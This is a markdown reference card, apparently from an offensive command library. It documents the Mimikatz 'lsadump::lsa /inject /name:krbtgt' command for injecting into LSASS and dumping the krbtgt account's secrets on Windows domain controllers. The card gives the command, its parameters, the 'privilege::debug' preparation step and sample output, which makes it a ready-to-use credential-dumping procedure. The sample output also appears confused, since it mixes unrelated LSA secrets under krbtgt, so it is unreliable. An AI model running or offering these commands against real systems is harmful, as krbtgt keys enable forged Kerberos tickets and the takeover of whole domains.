---
id: ba1bc3f5-41c5-4724-ae06-4f559ce0826b
name: mimikatz-lsadump-lsa-inject-krbtgt
type: command
executor: mimikatz
data: 'lsadump::lsa /inject /name:krbtgt'
output: null
created_at: '2023-04-06T03:56:04.067311+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - active-directory
verified: true
validated: true
---

# mimikatz-lsadump-lsa-inject-krbtgt

## Command

```cmd
lsadump::lsa /inject /name:krbtgt
```

## Description

This Mimikatz command uses the lsadump module to inject into LSASS and dump LSA secrets, filtered to the krbtgt account. It extracts sensitive data like passwords and keys stored in the LSA for domain compromise.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /inject | Enables process injection to access protected LSA data | Yes |
| /name:krbtgt | Specifies the target account name for secret dumping | Yes |

## Examples

### Basic Usage

Within Mimikatz prompt:

```cmd
lsadump::lsa /inject /name:krbtgt
```

### Full Context Usage

After privilege elevation:

```cmd
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

## Expected Output

Output includes decrypted LSA secrets for krbtgt, such as:

```
LSA Secrets
  PolicyValues
    BackupKey : Nt5BackupKey
    CurrentKey : Nt5CurrentKey
  krbtgt
    Secret : $MACHINE.ACC
    ...
[Secret Value] : 01000000d08c9ddf...
```
(Secrets appear as hex or base64; success shows values without injection failures.)

## Related

- [[procedures/Dumping-AD-Domain-Credentials-using-Mimikatz-sekurlsa]]
- [[commands/mimikatz-sekurlsa-dump-krbtgt]]
